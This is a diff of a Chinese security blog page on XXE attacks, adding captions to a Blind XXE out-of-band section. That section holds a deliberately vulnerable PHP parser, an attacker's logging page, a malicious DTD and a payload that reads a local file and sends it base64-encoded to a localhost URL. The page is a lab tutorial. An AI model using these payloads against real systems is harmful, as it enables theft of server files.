@@ -112,7 +112,7 @@
 <meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.03.XXE_OOB_accesslog.png">
 <meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.01.03.XXE_OOB_data.png">
 <meta property="og:image" content="https://chirec.github.io/2019/05/09/XXE/02.02.02.01.internal_network_detect.png">
-<meta property="og:updated_time" content="2019-05-11T03:20:05.650Z">
+<meta property="og:updated_time" content="2019-05-12T14:12:41.959Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;XXE&#39;">
 <meta name="twitter:description" content="XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。">
@@ -410,14 +410,19 @@
 <img src="/2019/05/09/XXE/02.01.02.XXE_Result.png">
 <h2 id="2-2-URL请求"><a href="#2-2-URL请求" class="headerlink" title="2.2 URL请求"></a>2.2 URL请求</h2><h3 id="2-2-1-Blind-XXE"><a href="#2-2-1-Blind-XXE" class="headerlink" title="2.2.1 Blind XXE"></a>2.2.1 Blind XXE</h3><p>在某些情况下，即使存在XXE漏洞，服务器并不会将数据回显。这种情况下，使用外带数据(Out Of Band, OOB)依然可以获得数据。</p>
 <p>test.php</p>
+<p>模拟具有XXE漏洞的站点，搭建在靶机上</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$xml = $_POST[<span class="string">'xml'</span>];</span><br><span class="line">	$data = @simplexml_load_string($xml);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">	@print_r($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>XXE_OOB.php</p>
+<p>用来接收带外数据的页面，由攻击者搭建</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$xxe = $_GET[<span class="string">'xxe'</span>];</span><br><span class="line">	$log = fopen(<span class="string">'xxe.txt'</span>,<span class="string">'a+'</span>);</span><br><span class="line">	fwrite($log,$xxe);</span><br><span class="line">	fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>evil.dtd</p>
+<p>恶意DTD，由攻击者构造</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost:8000/Blind_XXE/XXE_OOB.php?xxe=%file;&apos;&gt;&quot;&gt;%all;</span><br></pre></td></tr></table></figure>
 <p>test.txt</p>
+<p>用来存放带外数据的文本文档</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello!</span><br></pre></td></tr></table></figure>
 <p>payload</p>
+<p>恶意请求</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xml=&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">	&lt;!DOCTYPE ANY[</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://localhost:8000/Blind_XXE/evil.dtd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%send;</span><br><span class="line">	]&gt;</span><br></pre></td></tr></table></figure>
 <p>访问test.php，将payload用post方式传入。<br><img src="/2019/05/09/XXE/02.02.01.01.XXE_OOB_POST.png">调用外部DTD文档<code>evil.dtd</code>，访问<code>XXE_OOB.php</code>，将数据写入<code>xxe.txt</code>文档中。<br><img src="/2019/05/09/XXE/02.02.01.02.XXE_OOB_Result.png"><br>也可以查看<code>access.log</code>获取数据。<br><img src="/2019/05/09/XXE/02.02.01.03.XXE_OOB_accesslog.png"></p>
 <p>数据<code>aGVsbG8h</code>经过Base64编码，解码后为<code>hello!</code></p>
@@ -550,7 +555,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-count">26</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
